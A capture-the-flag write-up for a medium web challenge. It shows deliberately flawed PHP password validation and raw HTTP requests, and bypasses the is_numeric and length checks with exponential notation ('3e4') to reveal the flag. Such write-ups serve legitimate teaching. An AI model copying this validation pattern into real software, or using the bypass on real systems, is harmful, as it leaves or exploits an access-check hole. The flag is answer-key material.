# Challenge Name: Big Number
- Level: medium

## Challenge Description:
a big number is needed to save the world\

Link: http://35.240.62.111/bignumber/

## Solution:
1 - Go to http://35.240.62.111/bignumber/
2 - Look at Code Source
```
<?php if (isset($_GET['password'])) {
    if (is_numeric($_GET['password'])){
        if (strlen($_GET['password']) < 4){
            if ($_GET['password'] > 999)
                die($flag);
            else
                print 'Too little';
        } else
                print 'Too long';
    } else
        print 'Password is not numeric';
}
?>
```

3 - Intercept request with Burp Suit
```
GET /bignumber/?password=333 HTTP/1.1
Host: 35.240.62.111
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://35.240.62.111/bignumber/
Upgrade-Insecure-Requests: 1
```
- Response: `Too little`

4 - Bypass is_numeric
- https://www.php.net/manual/en/function.is-numeric.php -> `Finds whether the given variable is numeric. Numeric strings consist of optional whitespace, optional sign, any number of digits, optional decimal part and optional exponential part. Thus +0123.45e6 is a valid numeric value.`\
- so we will try using exponential, like 3e4 is > 999 and strlen("3e4") < 4 
- Request
```
GET /bignumber/?password=3e4 HTTP/1.1
Host: 35.240.62.111
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://35.240.62.111/bignumber/
Upgrade-Insecure-Requests: 1
```
- Response: `FLAG{Yes_Y0u_C4n_Use_Exp0nentiaL}`